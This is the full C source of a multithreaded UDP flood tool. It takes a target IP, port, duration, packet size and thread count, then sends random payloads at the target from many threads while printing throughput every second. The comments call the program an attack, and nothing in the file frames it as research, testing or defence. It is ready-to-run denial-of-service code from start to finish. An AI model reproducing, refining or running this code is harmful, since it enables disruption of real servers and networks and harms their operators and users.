#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <stdatomic.h>
#include <fcntl.h>

// Structure to store attack parameters
typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    int packet_size;
    int thread_id;
} attack_params;

// Global variables
volatile int keep_running = 1;
atomic_long total_data_sent = 0;
char *global_payload;

// Signal handler for graceful shutdown
void handle_signal(int signal) {
    keep_running = 0;
}

// Function to generate a random payload once
void generate_random_payload(char *payload, int size) {
    for (int i = 0; i < size; i++) {
        payload[i] = rand() % 256;
    }
}

// Function to monitor total network usage in real time
void *network_monitor(void *arg) {
    while (keep_running) {
        sleep(1);
        long data_sent_in_bytes = atomic_exchange(&total_data_sent, 0);
        double data_sent_in_mb = data_sent_in_bytes / (1024.0 * 1024.0);
        printf("Total data sent in the last second: %.2f MB\n", data_sent_in_mb);
        fflush(stdout);
    }
    pthread_exit(NULL);
}

// Function to perform the UDP flood attack
void *udp_flood(void *arg) {
    attack_params *params = (attack_params *)arg;
    int sock;
    struct sockaddr_in server_addr;

    // Create a UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    fcntl(sock, F_SETFL, O_NONBLOCK);

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->target_port);
    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    if (server_addr.sin_addr.s_addr == INADDR_NONE) {
        fprintf(stderr, "Invalid IP address.\n");
        close(sock);
        return NULL;
    }

    // Attack loop
    time_t end_time = time(NULL) + params->duration;
    while (time(NULL) < end_time && keep_running) {
        sendto(sock, global_payload, params->packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        atomic_fetch_add(&total_data_sent, params->packet_size);
    }

    close(sock);
    printf("Thread %d completed.\n", params->thread_id);
    fflush(stdout);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("Usage: %s [IP] [PORT] [DURATION] [PACKET_SIZE] [THREAD_COUNT]\n", argv[0]);
        return EXIT_FAILURE;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int packet_size = atoi(argv[4]);
    int thread_count = atoi(argv[5]);

    if (packet_size <= 0 || thread_count <= 0) {
        fprintf(stderr, "Invalid packet size or thread count.\n");
        return EXIT_FAILURE;
    }

    // Setup signal handler for graceful shutdown
    signal(SIGINT, handle_signal);

    // Allocate memory for the global payload
    global_payload = (char *)malloc(packet_size);
    if (global_payload == NULL) {
        perror("Memory allocation failed");
        return EXIT_FAILURE;
    }

    // Generate random payload once
    generate_random_payload(global_payload, packet_size);

    pthread_t threads[thread_count];
    attack_params params[thread_count];

    // Create a network monitoring thread
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, network_monitor, NULL);

    // Launch attack threads
    for (int i = 0; i < thread_count; i++) {
        params[i].target_ip = target_ip;
        params[i].target_port = target_port;
        params[i].duration = duration;
        params[i].packet_size = packet_size;
        params[i].thread_id = i;

        if (pthread_create(&threads[i], NULL, udp_flood, &params[i]) != 0) {
            fprintf(stderr, "Failed to create thread %d\n", i);
        }
    }

    // Wait for all threads to complete
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    keep_running = 0;
    pthread_join(monitor_thread, NULL);

    free(global_payload);
    printf("Attack finished. All threads stopped.\n");
    fflush(stdout);
    return EXIT_SUCCESS;
}
